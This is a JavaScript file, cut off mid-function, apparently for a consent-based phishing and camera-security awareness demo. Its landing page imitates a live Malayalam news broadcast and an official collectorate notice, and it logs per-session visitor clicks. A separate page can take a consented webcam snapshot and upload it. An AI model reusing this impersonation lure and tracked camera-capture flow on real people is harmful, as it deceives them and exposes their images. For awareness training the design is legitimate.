/**
 * Video Landing Page & Camera Security Demonstration Logic
 * StreamSafe Media video portal with separate, consent-based camera security test.
 */

(() => {
  'use strict';

  // State Variables
  let sessionId = null;
  let sessionData = null;
  let activeStream = null;
  let capturedBlob = null;
  let capturedDataUrl = null;

  // Video Player Simulation State (for index.html)
  let isVideoPlaying = false;
  let videoCurrentSeconds = 0;
  const videoTotalSeconds = 222; // 03:42
  let videoAnimFrameId = null;
  let isVideoMuted = false;
  let likeCount = 24650;
  let hasLiked = false;
  let canvasCtx = null;

  // Cinematic Starfield Particles for Canvas
  const NUM_STARS = 140;
  let stars = [];

  // =========================================================================
  // DOM ELEMENT SELECTION
  // =========================================================================

  // Common Header & Indicator
  const statusDot = document.getElementById('status-dot');
  const statusText = document.getElementById('status-text');

  // Video Landing Page Elements (index.html)
  const videoPlayerWrapper = document.getElementById('video-player-wrapper');
  const videoPoster = document.getElementById('video-poster');
  const btnPosterPlay = document.getElementById('btn-poster-play');
  const videoCanvasStage = document.getElementById('video-canvas-stage');
  const interactiveVideoCanvas = document.getElementById('interactive-video-canvas');
  const videoScrubber = document.getElementById('video-scrubber');
  const videoScrubberProgress = document.getElementById('video-scrubber-progress');
  const btnPlayerPlay = document.getElementById('btn-player-play');
  const videoTimecode = document.getElementById('video-timecode');
  const btnPlayerMute = document.getElementById('btn-player-mute');
  const btnPlayerFullscreen = document.getElementById('btn-player-fullscreen');
  const btnWatchDemo = document.getElementById('btn-watch-demo');
  const btnLikeVideo = document.getElementById('btn-like-video');
  const likeCountSpan = document.getElementById('like-count');
  const btnSharePage = document.getElementById('btn-share-page');
  const descPreview = document.getElementById('desc-preview');
  const btnDescToggle = document.getElementById('btn-desc-toggle');
  const toastNotification = document.getElementById('toast-notification');
  const toastText = document.getElementById('toast-text');
  const adSponsorLink = document.getElementById('ad-sponsor-link');
  const sidebarDemoLink = document.getElementById('sidebar-demo-link');

  // Camera Demonstration & Phishing Awareness Elements (demo.html)
  const cameraVideo = document.getElementById('camera-video');
  const cameraCanvas = document.getElementById('camera-canvas');
  const screenConsent = document.getElementById('screen-consent');
  const screenCapturing = document.getElementById('screen-capturing');
  const screenReview = document.getElementById('screen-review');
  const screenSuccess = document.getElementById('screen-success');
  const screenCancelled = document.getElementById('screen-cancelled');
  const screenDebrief = document.getElementById('screen-debrief');

  const radioModeSynthetic = document.getElementById('radio-mode-synthetic');
  const radioModeLive = document.getElementById('radio-mode-live');
  const modeCardSynthetic = document.getElementById('mode-card-synthetic');
  const modeCardLive = document.getElementById('mode-card-live');
  const liveCameraDisclosures = document.getElementById('live-camera-disclosures');
  const btnStartText = document.getElementById('btn-start-text');

  const capturingTitle = document.getElementById('capturing-title');
  const capturingDesc = document.getElementById('capturing-desc');
  const sessionStatusBadge = document.getElementById('session-status-badge');
  const receiptTimestamp = document.getElementById('receipt-timestamp');
  const receiptPreviewImg = document.getElementById('receipt-preview-img');
  const debriefPreviewImg = document.getElementById('debrief-preview-img');
  const debriefCompletionMeta = document.getElementById('debrief-completion-meta');
  const cameraErrorContainer = document.getElementById('camera-error-container');
  const consentUploadCheckbox = document.getElementById('consent-upload-checkbox');

  const btnStartTest = document.getElementById('btn-start-test');
  const btnConfirmUpload = document.getElementById('btn-confirm-upload');
  const btnRetakePhoto = document.getElementById('btn-retake-photo');
  const btnDiscardPhoto = document.getElementById('btn-discard-photo');
  const btnRestartDemo = document.getElementById('btn-restart-demo');
  const btnTestAgain = document.getElementById('btn-test-again');
  const btnRestartSimulation = document.getElementById('btn-restart-simulation');

  // Telemetry helper: Records non-sensitive awareness events (only when session ID is present)
  async function recordAwarenessEvent(eventType, metadata = null) {
    if (!sessionId) return; // Do not auto-create ephemeral sessions for general landing page visitors
    try {
      const apiUrl = window.APP_CONFIG.getApiBaseUrl();
      await fetch(`${apiUrl}/api/sessions/${sessionId}/events`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ eventType, metadata })
      });
    } catch (e) {
      console.warn('[AwarenessTelemetry] Non-critical event logging error:', e.message);
    }
  }

  // =========================================================================
  // INITIALIZATION
  // =========================================================================

  async function init() {
    checkBackendHealth();
    parseSessionFromUrl();

    // Check if on Landing Page (index.html)
    if (videoPlayerWrapper) {
      initLandingPage();
    }

    // Check if on Camera Demonstration Page (demo.html)
    if (screenConsent) {
      initDemoPage();
    }
  }

  function parseSessionFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    const param = urlParams.get('session');
    if (param && param.trim() !== '') {
      sessionId = param.trim();
    }
  }

  // Health check to update header status dot
  async function checkBackendHealth() {
    if (!statusDot || !statusText) return;
    const apiUrl = window.APP_CONFIG.getApiBaseUrl();
    try {
      const response = await fetch(`${apiUrl}/api/health`, {
        method: 'GET',
        headers: { 'Accept': 'application/json' }
      });
      if (response.ok) {
        statusDot.className = 'indicator-dot';
        statusText.textContent = 'API Online';
      } else {
        statusDot.className = 'indicator-dot offline';
        statusText.textContent = `API Error ${response.status}`;
      }
    } catch (e) {
      statusDot.className = 'indicator-dot offline';
      statusText.textContent = 'API Connecting...';
    }
  }

  // =========================================================================
  // LANDING PAGE LOGIC (index.html)
  // =========================================================================

  function initLandingPage() {
    // Note: NEVER requests camera permission or opens camera video on load.
    recordAwarenessEvent('page_opened');

    if (btnPosterPlay) {
      btnPosterPlay.addEventListener('click', startVideoPlayback);
    }
    if (videoPoster) {
      videoPoster.addEventListener('click', startVideoPlayback);
    }
    if (btnWatchDemo) {
      btnWatchDemo.addEventListener('click', () => {
        recordAwarenessEvent('demo_button_clicked', { source: 'watch_video_button' });
        videoPlayerWrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
        startVideoPlayback();
      });
    }
    if (adSponsorLink) {
      adSponsorLink.addEventListener('click', (e) => {
        e.preventDefault();
        recordAwarenessEvent('demo_button_clicked', { source: 'ad_banner_cta' });
        showToast('📰 കാസർഗോഡ് ജില്ലാ കളക്ടറേറ്റ് ഔദ്യോഗിക വാർത്താക്കുറിപ്പ് ലോഡ് ചെയ്യുന്നു...');
      });
    }
    if (sidebarDemoLink) {
      sidebarDemoLink.addEventListener('click', () => {
        recordAwarenessEvent('demo_button_clicked', { source: 'sidebar_demo_card' });
      });
    }
    if (interactiveVideoCanvas) {
      interactiveVideoCanvas.addEventListener('click', toggleVideoPlayPause);
    }
    if (btnPlayerPlay) {
      btnPlayerPlay.addEventListener('click', toggleVideoPlayPause);
    }
    if (btnPlayerMute) {
      btnPlayerMute.addEventListener('click', toggleVideoMute);
    }
    if (btnPlayerFullscreen) {
      btnPlayerFullscreen.addEventListener('click', toggleFullscreen);
    }
    if (videoScrubber) {
      videoScrubber.addEventListener('click', handleSeek);
    }

    // Mini cards interaction
    const miniCards = document.querySelectorAll('.video-card-mini:not([href])');
    miniCards.forEach((card) => {
      card.addEventListener('click', () => {
        const title = card.querySelector('.mini-title')?.textContent || 'Related Video';
        showToast(`വാർത്ത ലോഡ് ചെയ്യുന്നു: ${title}`);
        videoPlayerWrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
        startVideoPlayback();
      });
    });

    // Like button
    if (btnLikeVideo && likeCountSpan) {
      btnLikeVideo.addEventListener('click', () => {
        hasLiked = !hasLiked;
        btnLikeVideo.classList.toggle('active', hasLiked);
        likeCount = hasLiked ? likeCount + 1 : likeCount - 1;
        likeCountSpan.textContent = (likeCount / 1000).toFixed(1) + 'K';
      });
    }

    // Share button
    if (btnSharePage) {
      btnSharePage.addEventListener('click', async () => {
        const shareUrl = window.location.href;
        if (navigator.clipboard) {
          await navigator.clipboard.writeText(shareUrl);
          showToast('🔗 വാർത്താ ലിങ്ക് ക്ലിപ്പ്ബോർഡിലേക്ക് പകർത്തി!');
        } else {
          showToast('ഷെയർ: ' + shareUrl);
        }
      });
    }

    // Description toggle
    if (btnDescToggle && descPreview) {
      btnDescToggle.addEventListener('click', () => {
        const isExpanded = descPreview.classList.toggle('expanded');
        btnDescToggle.textContent = isExpanded ? 'കുറച്ച് കാണിക്കുക' : 'കൂടുതൽ കാണിക്കുക';
      });
    }

    // Canvas resize
    initCanvasDimensions();
    window.addEventListener('resize', initCanvasDimensions);
  }

  function initCanvasDimensions() {
    if (!interactiveVideoCanvas) return;
    const rect = interactiveVideoCanvas.getBoundingClientRect();
    interactiveVideoCanvas.width = rect.width * (window.devicePixelRatio || 1);
    interactiveVideoCanvas.height = rect.height * (window.devicePixelRatio || 1);
    canvasCtx = interactiveVideoCanvas.getContext('2d');
  }

  function startVideoPlayback() {
    videoPoster.classList.add('hidden');
    videoCanvasStage.style.display = 'block';
    isVideoPlaying = true;
    btnPlayerPlay.textContent = '⏸';
    initCanvasDimensions();
    runVideoLoop();
  }

  function toggleVideoPlayPause() {
    isVideoPlaying = !isVideoPlaying;
    btnPlayerPlay.textContent = isVideoPlaying ? '⏸' : '▶';
    if (isVideoPlaying) {
      runVideoLoop();
    }
  }

  function toggleVideoMute() {
    isVideoMuted = !isVideoMuted;
    btnPlayerMute.textContent = isVideoMuted ? '🔇' : '🔊';
  }

  function toggleFullscreen() {
    if (!document.fullscreenElement) {
      videoPlayerWrapper.requestFullscreen().catch(() => {});
    } else {
      document.exitFullscreen().catch(() => {});
    }
  }

  function handleSeek(e) {
    const rect = videoScrubber.getBoundingClientRect();
    const ratio = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
    videoCurrentSeconds = ratio * videoTotalSeconds;
    updateVideoTimecodeUI();
  }

  function formatTime(totalSec) {
    const m = Math.floor(totalSec / 60);
    const s = Math.floor(totalSec % 60);
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  }

  function updateVideoTimecodeUI() {
    const progressPct = (videoCurrentSeconds / videoTotalSeconds) * 100;
    videoScrubberProgress.style.width = `${progressPct}%`;
    videoTimecode.textContent = `${formatTime(videoCurrentSeconds)} / ${formatTime(videoTotalSeconds)}`;
  }

  // News Broadcast Animation Elements
  const tickerMalayalamText = "🔴 ബ്രേക്കിംഗ് ന്യൂസ്: ദേശീയ സെമിനാറിനിടെ പ്രതിഷേധം; വിദ്യാര്‍ത്ഥികള്‍ക്കെതിരെ കേസ്  •  ഭാര്യവീട്ടിൽ നിന്ന് ബൈക്കിൽ തിരിച്ചുവരവേ യുവാവിന് മിന്നലേറ്റു, ആശുപത്രിയിലെത്തിച്ചെങ്കിലും മരിച്ചു  •  മന്ത്രി ഒ ജെ ജനീഷിനെ തടഞ്ഞ് DYFI; യൂത്ത് കോൺഗ്രസ് സ്വീകരണം  •  കാലിക്കടവ് എംഡിഎംഎ കടത്ത്: മുഖ്യപ്രതിയായ വിദേശപൗരന്‍ യുപിയില്‍ പിടിയില്‍  •  കാഞ്ഞങ്ങാട് റെയിൽവേ വികസനം: സർവേ നടപടികൾ വേഗത്തിലാക്കി  •  ";
  let tickerOffset = 0;

  function renderCinematicVideoFrame(timestamp) {
    if (!canvasCtx || !interactiveVideoCanvas) return;
    const w = interactiveVideoCanvas.width;
    const h = interactiveVideoCanvas.height;
    const scale = w / 800;

    // 1. Television Broadcast Studio Background (Dark Burgundy & Slate Navy)
    const bgGrad = canvasCtx.createRadialGradient(w * 0.5, h * 0.4, 20 * scale, w * 0.5, h * 0.5, w * 0.75);
    bgGrad.addColorStop(0, '#2b0707');
    bgGrad.addColorStop(0.4, '#130514');
    bgGrad.addColorStop(0.8, '#080d1a');
    bgGrad.addColorStop(1, '#02050b');
    canvasCtx.fillStyle = bgGrad;
    canvasCtx.fillRect(0, 0, w, h);

    // 2. Studio Background Grid & Perspective Floor
    canvasCtx.strokeStyle = 'rgba(224, 0, 0, 0.08)';
    canvasCtx.lineWidth = 1 * scale;
    const gridCols = 16;
    for (let i = 0; i <= gridCols; i++) {
      const gx = (w / gridCols) * i;
      canvasCtx.beginPath();
      canvasCtx.moveTo(gx, 0);
      canvasCtx.lineTo(gx, h);
      canvasCtx.stroke();
    }
    const gridRows = 10;
    for (let j = 0; j <= gridRows; j++) {
      const gy = (h / gridRows) * j;
      canvasCtx.beginPath();
      canvasCtx.moveTo(0, gy);
      canvasCtx.lineTo(w, gy);
      canvasCtx.stroke();
    }

    // 3. Central 3D Rotating News Globe & Concentric Broadcast Radar Rings
    const centerX = w * 0.5;
    const centerY = h * 0.44;
    const globeRadius = 85 * scale;
    const angle = (timestamp * 0.0006) % (Math.PI * 2);

    // Broadcast Outer Glow
    const glowGrad = canvasCtx.createRadialGradient(centerX, centerY, globeRadius * 0.6, centerX, centerY, globeRadius * 1.8);
    glowGrad.addColorStop(0, 'rgba(224, 0, 0, 0.35)');
    glowGrad.addColorStop(0.5, 'rgba(185, 28, 28, 0.12)');
    glowGrad.addColorStop(1, 'transparent');
    canvasCtx.fillStyle = glowGrad;
    canvasCtx.beginPath();
    canvasCtx.arc(centerX, centerY, globeRadius * 1.8, 0, Math.PI * 2);
    canvasCtx.fill();

    // Concentric Radar Rings
    for (let r = 1; r <= 3; r++) {
      canvasCtx.save();
      canvasCtx.translate(centerX, centerY);
      canvasCtx.rotate(angle * (r % 2 === 0 ? 1 : -1) * 0.7);
      canvasCtx.beginPath();
      canvasCtx.ellipse(0, 0, globeRadius * (1 + r * 0.35), globeRadius * (0.35 + r * 0.12), 0, 0, Math.PI * 2);
      canvasCtx.strokeStyle = r === 1 ? 'rgba(224, 0, 0, 0.45)' : 'rgba(56, 189, 248, 0.25)';
      canvasCtx.lineWidth = (2 - r * 0.3) * scale;
      canvasCtx.stroke();
      canvasCtx.restore();
    }

    // Central Studio Sphere / Digital News Earth
    const sphereGrad = canvasCtx.createRadialGradient(
      centerX - globeRadius * 0.3,
      centerY - globeRadius * 0.3,
      globeRadius * 0.1,
      centerX,
      centerY,
      globeRadius
    );
    sphereGrad.addColorStop(0, '#ff4d4d');
    sphereGrad.addColorStop(0.3, '#b91c1c');
    sphereGrad.addColorStop(0.7, '#1e293b');
    sphereGrad.addColorStop(1, '#020617');
    canvasCtx.fillStyle = sphereGrad;
    canvasCtx.beginPath();
    canvasCtx.arc(centerX, centerY, globeRadius, 0, Math.PI * 2);
    canvasCtx.fill();

    // Studio Meridians / Latitude Grid on Sphere
    canvasCtx.save();
    canvasCtx.beginPath();
    canvasCtx.arc(centerX, centerY, globeRadius, 0, Math.PI * 2);
    canvasCtx.clip();

    canvasCtx.strokeStyle = 'rgba(255, 255, 255, 0.35)';
    canvasCtx.lineWidth = 1 * scale;
    for (let m = -2; m <= 2; m++) {
      const shift = ((timestamp * 0.04) % 100) / 100;
      const mx = centerX + (m + shift) * (globeRadius * 0.75);
      canvasCtx.beginPath();
      canvasCtx.ellipse(mx, centerY, globeRadius * 0.35, globeRadius * 0.98, 0, 0, Math.PI * 2);
      canvasCtx.stroke();
    }
    canvasCtx.restore();

    // News Studio Title Graphic over Sphere
    canvasCtx.fillStyle = '#ffffff';
    canvasCtx.font = `900 ${15 * scale}px sans-serif`;
    canvasCtx.textAlign = 'center';
    canvasCtx.shadowColor = 'rgba(0, 0, 0, 0.9)';
    canvasCtx.shadowBlur = 8;
    canvasCtx.fillText('KASARAGOD 24x7', centerX, centerY - 8 * scale);
    canvasCtx.fillStyle = '#fca5a5';
    canvasCtx.font = `bold ${10 * scale}px sans-serif`;
    canvasCtx.fillText('തത്സമയ സംപ്രേഷണം', centerX, centerY + 12 * scale);
    canvasCtx.shadowBlur = 0;

    // 4. Studio Audio Spectrum Visualizer (Live Broadcaster Voice Level)
    const barCount = 42;
    const barW = 6 * scale;
    const gap = 3.5 * scale;
    const totalSpectrumW = barCount * (barW + gap);
    const startX = (w - totalSpectrumW) / 2;
    const baseY = h - 68 * scale;

    for (let i = 0; i < barCount; i++) {
      let amp = 0;
      if (isVideoPlaying && !isVideoMuted) {
        const wave1 = Math.sin(timestamp * 0.007 + i * 0.35);
        const wave2 = Math.cos(timestamp * 0.003 + i * 0.22);
        const wave3 = Math.sin(timestamp * 0.012 + i * 0.6);
        amp = Math.abs(wave1 * 0.5 + wave2 * 0.3 + wave3 * 0.2);
      } else {
        amp = Math.sin(timestamp * 0.002 + i * 0.2) * 0.15;
      }
      const barH = isVideoPlaying ? (6 + amp * 34) * scale : 4 * scale;

      const barGrad = canvasCtx.createLinearGradient(0, baseY, 0, baseY - barH);
      barGrad.addColorStop(0, '#e00000');
      barGrad.addColorStop(0.6, '#f87171');
      barGrad.addColorStop(1, '#ffffff');

      canvasCtx.fillStyle = barGrad;
      canvasCtx.fillRect(startX + i * (barW + gap), baseY - barH, barW, barH);
    }

    // 5. Top Broadcast HUD Bar
    canvasCtx.fillStyle = 'rgba(6, 11, 20, 0.88)';
    canvasCtx.fillRect(12 * scale, 12 * scale, w - 24 * scale, 34 * scale);
    canvasCtx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
    canvasCtx.strokeRect(12 * scale, 12 * scale, w - 24 * scale, 34 * scale);

    // Glowing Live Pill
    canvasCtx.fillStyle = '#e00000';
    canvasCtx.beginPath();
    canvasCtx.roundRect(20 * scale, 18 * scale, 58 * scale, 22 * scale, 4 * scale);
    canvasCtx.fill();

    canvasCtx.fillStyle = '#ffffff';
    canvasCtx.font = `900 ${10 * scale}px sans-serif`;
    canvasCtx.textAlign = 'center';
    canvasCtx.fillText('● LIVE', 49 * scale, 33 * scale);

    // Channel name & Bureau
    canvasCtx.fillStyle = '#ffffff';
    canvasCtx.font = `bold ${11 * scale}px sans-serif`;
    canvasCtx.textAlign = 'left';
    canvasCtx.fillText('KERALA VISION NEWS', 86 * scale, 34 * scale);

    canvasCtx.fillStyle = '#ffd700';
    canvasCtx.font = `bold ${9 * scale}px sans-serif`;
    canvasCtx.fillText('കാസർഗോഡ് ബ്യൂറോ', 230 * scale, 34 * scale);

    // Right side technical telemetry
    const now = new Date();
    const timeStr = now.toLocaleTimeString('en-US', { hour12: false });
    canvasCtx.fillStyle = '#cbd5e1';
    canvasCtx.font = `${10 * scale}px monospace`;
    canvasCtx.textAlign = 'right';
    canvasCtx.fillText(`${timeStr} IST • HD 1080P 50FPS`, w - 22 * scale, 34 * scale);
    canvasCtx.textAlign = 'left';

    // 6. Realistic Lower Third (L-Band News Banner with Malayalam Scrolling Ticker)
    const bannerH = 48 * scale;
    const bannerY = h - 62 * scale;

    // Top Tag Bar of Lower Third
    canvasCtx.fillStyle = '#990000';
    canvasCtx.fillRect(0, bannerY - 18 * scale, w, 18 * scale);
    canvasCtx.fillStyle = '#ffffff';
    canvasCtx.font = `bold ${9 * scale}px sans-serif`;
    canvasCtx.fillText('🔴 KERALA VISION BREAKING &bull; കാസർഗോഡ് തത്സമയ വാർത്തകൾ', 16 * scale, bannerY - 5 * scale);

    // Main Ticker Bar Background
    canvasCtx.fillStyle = 'rgba(10, 15, 26, 0.95)';
    canvasCtx.fillRect(0, bannerY, w, bannerH);
    canvasCtx.strokeStyle = 'rgba(224, 0, 0, 0.4)';
    canvasCtx.lineWidth = 1 * scale;
    canvasCtx.beginPath();
    canvasCtx.moveTo(0, bannerY);
    canvasCtx.lineTo(w, bannerY);
    canvasCtx.stroke();

    // Red Fixed Badge on Left
    const badgeW = 100 * scale;
    canvasCtx.fillStyle = '#e00000';
    canvasCtx.fillRect(0, bannerY, badgeW, bannerH);
    canvasCtx.fillStyle = '#ffffff';
    canvasCtx.font = `900 ${11 * scale}px sans-serif`;
    canvasCtx.textAlign = 'center';
    canvasCtx.fillText('പ്രധാനം', badgeW / 2, bannerY + 22 * scale);
    canvasCtx.font = `600 ${8 * scale}px sans-serif`;
    canvasCtx.fillText('FLASH NEWS', badgeW / 2, bannerY + 36 * scale);
    canvasCtx.textAlign = 'left';

    // Scrolling Ticker Text
    canvasCtx.save();
    canvasCtx.beginPath();
    canvasCtx.rect(badgeW + 10 * scale, bannerY, w - badgeW - 15 * scale, bannerH);
    canvasCtx.clip();

    if (isVideoPlaying) {
      tickerOffset += 1.2 * scale;
    }

    canvasCtx.font = `bold ${12 * scale}px 'Noto Sans Malayalam', sans-serif`;
    canvasCtx.fillStyle = '#ffffff';
    const textWidth = canvasCtx.measureText(tickerMalayalamText).width;
    if (tickerOffset > textWidth) {
      tickerOffset = 0;
    }

    const drawX = badgeW + 15 * scale - tickerOffset;
    canvasCtx.fillText(tickerMalayalamText, drawX, bannerY + 28 * scale);
    canvasCtx.fillText(tickerMalayalamText, drawX + textWidth, bannerY + 28 * scale);
    canvasCtx.restore();

    // 7. Paused Screen Overlay
    if (!isVideoPlaying) {
      canvasCtx.fillStyle = 'rgba(3, 7, 18, 0.72)';
      canvasCtx.fillRect(0, 0, w, h);

      canvasCtx.fillStyle = '#ffffff';
      canvasCtx.font = `bold ${16 * scale}px sans-serif`;
      canvasCtx.textAlign = 'center';
      canvasCtx.fillText('⏸ ലൈവ് സ്ട്രീം താൽക്കാലികമായി നിർത്തിവച്ചിരിക്കുന്നു', w / 2, h / 2 - 12 * scale);

      canvasCtx.fillStyle = '#f87171';
      canvasCtx.font = `${11 * scale}px sans-serif`;
      canvasCtx.fillText('തുടർന്ന് കാണുവാൻ പ്ലെയറിൽ ക്ലിക്ക് ചെയ്യുക (Click to Resume)', w / 2, h / 2 + 14 * scale);
      canvasCtx.textAlign = 'left';
    }
  }

  let lastTimestamp = 0;
  function runVideoLoop(now) {
    if (!isVideoPlaying) return;
    if (now && lastTimestamp) {
      const deltaSec = (now - lastTimestamp) / 1000;
      videoCurrentSeconds += deltaSec;
      if (videoCurrentSeconds >= videoTotalSeconds) {
        videoCurrentSeconds = videoTotalSeconds;
        isVideoPlaying = false;
        btnPlayerPlay.textContent = '▶';
      }
      updateVideoTimecodeUI();
    }
    lastTimestamp = now || performance.now();
    renderCinematicVideoFrame(lastTimestamp);
    if (isVideoPlaying) {
      videoAnimFrameId = requestAnimationFrame(runVideoLoop);
    }
  }

  function showToast(message) {
    if (!toastNotification || !toastText) return;
    toastText.textContent = message;
    toastNotification.style.display = 'block';
    setTimeout(() => {
      toastNotification.style.display = 'none';
    }, 3000);
  }

  // =========================================================================
  // CAMERA DEMONSTRATION LOGIC (demo.html)
  // =========================================================================

  function initDemoPage() {
    bindDemoEvents();
    bindSimulationModeSelector();

    // Safety: ensure all camera tracks are stopped if user navigates away
    window.addEventListener('beforeunload', stopCameraTracks);
    window.addEventListener('pagehide', stopCameraTracks);

    // If session ID provided in URL, pre-validate status
    if (sessionId) {
      checkInitialSessionStatus();
    }
  }

  function bindSimulationModeSelector() {
    if (radioModeSynthetic) {
      radioModeSynthetic.addEventListener('change', () => {
        if (radioModeSynthetic.checked) {
          if (modeCardSynthetic) modeCardSynthetic.classList.add('active');
          if (modeCardLive) modeCardLive.classList.remove('active');
          if (liveCameraDisclosures) liveCameraDisclosures.style.display = 'none';
          if (btnStartText) btnStartText.textContent = '🚀 Run Safe Awareness Simulation';
        }
      });
    }

    if (radioModeLive) {
      radioModeLive.addEventListener('change', () => {
        if (radioModeLive.checked) {
          if (modeCardLive) modeCardLive.classList.add('active');
          if (modeCardSynthetic) modeCardSynthetic.classList.remove('active');
          if (liveCameraDisclosures) liveCameraDisclosures.style.display = 'block';
          if (btnStartText) btnStartText.textContent = '📷 Agree & Start Hardware Permission Test';
        }
      });
    }
  }

  function bindDemoEvents() {
    if (btnStartTest) {
      btnStartTest.addEventListener('click', handleStartTest);
    }
    if (btnConfirmUpload) {
      btnConfirmUpload.addEventListener('click', handleConfirmUpload);
    }
    if (btnRetakePhoto) {
      btnRetakePhoto.addEventListener('click', handleStartTest);
    }
    if (btnDiscardPhoto) {
      btnDiscardPhoto.addEventListener('click', handleCancelDemo);
    }
    if (btnRestartDemo) {
      btnRestartDemo.addEventListener('click', () => {
        screenCancelled.style.display = 'none';
        screenConsent.style.display = 'block';
      });
    }
    if (btnTestAgain) {
      btnTestAgain.addEventListener('click', resetSimulationToStart);
    }
    if (btnRestartSimulation) {
      btnRestartSimulation.addEventListener('click', resetSimulationToStart);
    }
  }

  function resetSimulationToStart() {
    capturedBlob = null;
    capturedDataUrl = null;
    if (screenSuccess) screenSuccess.style.display = 'none';
    if (screenDebrief) screenDebrief.style.display = 'none';
    if (screenCancelled) screenCancelled.style.display = 'none';
    if (screenReview) screenReview.style.display = 'none';
    if (screenCapturing) screenCapturing.style.display = 'none';
    if (screenConsent) screenConsent.style.display = 'block';
    sessionStatusBadge.textContent = 'Simulation Ready';
    sessionStatusBadge.className = 'badge badge-created';
  }

  async function checkInitialSessionStatus() {
    const apiUrl = window.APP_CONFIG.getApiBaseUrl();
    try {
      const res = await fetch(`${apiUrl}/api/sessions/${sessionId}`, {
        method: 'GET',
        headers: { 'Accept': 'application/json' }
      });
      if (res.ok) {
        const data = await res.json();
        sessionData = data;
        if (data.status === 'submitted') {
          sessionStatusBadge.textContent = 'Already Submitted';
          sessionStatusBadge.className = 'badge badge-submitted';
          showCameraError('This demonstration session has already been completed. A test snapshot was previously delivered.', false);
          if (btnStartTest) btnStartTest.disabled = true;
        } else if (data.status === 'revoked') {
          sessionStatusBadge.textContent = 'Revoked';
          sessionStatusBadge.className = 'badge badge-revoked';
          showCameraError('This demonstration session was revoked by the administrator.', false);
          if (btnStartTest) btnStartTest.disabled = true;
        } else if (data.status === 'expired') {
          sessionStatusBadge.textContent = 'Expired';
          sessionStatusBadge.className = 'badge badge-expired';
          showCameraError('This demonstration session has expired. You may still run the test with a fresh demonstration session.', false);
          sessionId = null;
          sessionData = null;
        } else {
          sessionStatusBadge.textContent = 'Ready';
          sessionStatusBadge.className = 'badge badge-opened';
          fetch(`${apiUrl}/api/sessions/${sessionId}/opened`, { method: 'POST' }).catch(() => {});
        }
      }
    } catch (err) {
      console.warn('[Demo] Could not pre-verify session:', err.message);
    }
  }

  function bindDemoEvents() {
    if (btnStartTest) {
      btnStartTest.addEventListener('click', handleStartTest);
    }
    if (btnConfirmUpload) {
      btnConfirmUpload.addEventListener('click', handleConfirmUpload);
    }
    if (btnRetakePhoto) {
      btnRetakePhoto.addEventListener('click', handleStartTest);
    }
    if (btnDiscardPhoto) {
      btnDiscardPhoto.addEventListener('click', handleCancelDemo);
    }
    if (btnRestartDemo) {
      btnRestartDemo.addEventListener('click', () => {
        screenCancelled.style.display = 'none';
        screenConsent.style.display = 'block';
      });
    }
    if (btnTestAgain) {
      btnTestAgain.addEventListener('click', () => {
        capturedBlob = null;
        capturedDataUrl = null;
        sessionId = null;
        sessionData = null;
        screenSuccess.style.display = 'none';
        screenConsent.style.display = 'block';
        sessionStatusBadge.textContent = 'Consent Required';
        sessionStatusBadge.className = 'badge badge-created';
      });
    }
  }

  async function ensureSessionReady() {
    const apiUrl = window.APP_CONFIG.getApiBaseUrl();

    // 1. If we have a validated active session, return it
    if (sessionId && sessionData && (sessionData.status === 'created' || sessionData.status === 'opened')) {
      return sessionId;
    }

    // 2. If a session ID was provided in URL, validate against backend
    if (sessionId) {
      try {
        const res = await fetch(`${apiUrl}/api/sessions/${sessionId}`, {
          method: 'GET',
          headers: { 'Accept': 'application/json' }
        });
        if (res.ok) {
          const data = await res.json();
          if (data.status === 'created' || data.status === 'opened') {
            sessionData = data;
            fetch(`${apiUrl}/api/sessions/${sessionId}/opened`, { method: 'POST' }).catch(() => {});
            return sessionId;
          }
        }
      } catch (e) {
        console.warn('[Demo] URL session verification failed:', e.message);
      }
    }

    // 3. Create fresh demonstration session via public demo endpoint
    try {
      const response = await fetch(`${apiUrl}/api/sessions/demo`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ label: 'Visitor Demo' })
      });

      if (response.ok) {
        const data = await response.json();
        sessionId = data.session.id;
        sessionData = data.session;
        return sessionId;
      }
    } catch (e) {
      console.warn('[Demo] Ephemeral session creation failed:', e.message);
    }

    throw new Error('Demonstration backend is currently unavailable or waking up. Please verify your connection and try again.');
  }

  // =========================================================================
  // SYNTHETIC SAMPLE TEST IMAGE GENERATOR (100% SAFE, ZERO HARDWARE ACCESS)
  // =========================================================================

  function drawSyntheticSampleImage(canvas) {
    const w = 640;
    const h = 480;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext('2d');

    // Gradient background
    const grad = ctx.createLinearGradient(0, 0, w, h);
    grad.addColorStop(0, '#0a0f1d');
    grad.addColorStop(0.5, '#0f172a');
    grad.addColorStop(1, '#020617');
    ctx.fillStyle = grad;
    ctx.fillRect(0, 0, w, h);

    // Security grid lines
    ctx.strokeStyle = 'rgba(56, 189, 248, 0.15)';
    ctx.lineWidth = 1;
    for (let x = 0; x < w; x += 32) {
      ctx.beginPath();
      ctx.moveTo(x, 0);
      ctx.lineTo(x, h);
      ctx.stroke();
    }
    for (let y = 0; y < h; y += 32) {
      ctx.beginPath();
      ctx.moveTo(0, y);
      ctx.lineTo(w, y);
      ctx.stroke();
    }

    // Outer Target Reticle
    ctx.strokeStyle = '#38bdf8';
    ctx.lineWidth = 2;
    ctx.strokeRect(35, 35, w - 70, h - 70);

    // Crosshairs
    ctx.beginPath();
    ctx.moveTo(w / 2, 20);
    ctx.lineTo(w / 2, h - 20);
    ctx.moveTo(20, h / 2);
    ctx.lineTo(w - 20, h / 2);
    ctx.strokeStyle = 'rgba(56, 189, 248, 0.3)';
    ctx.stroke();

    // Center silhouette circle
    ctx.beginPath();
    ctx.arc(w / 2, h / 2 - 25, 60, 0, Math.PI * 2);
    ctx.fillStyle = 'rgba(30, 58, 138, 0.5)';
    ctx.fill();
    ctx.strokeStyle = '#60a5fa';
    ctx.lineWidth = 3;
    ctx.stroke();

    // Shield Icon
    ctx.font = '50px sans-serif';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.fillText('🛡️', w / 2, h / 2 - 25);

    // Calibration watermark banner
    ctx.fillStyle = 'rgba(15, 23, 42, 0.9)';
    ctx.fillRect(45, h - 110, w - 90, 75);
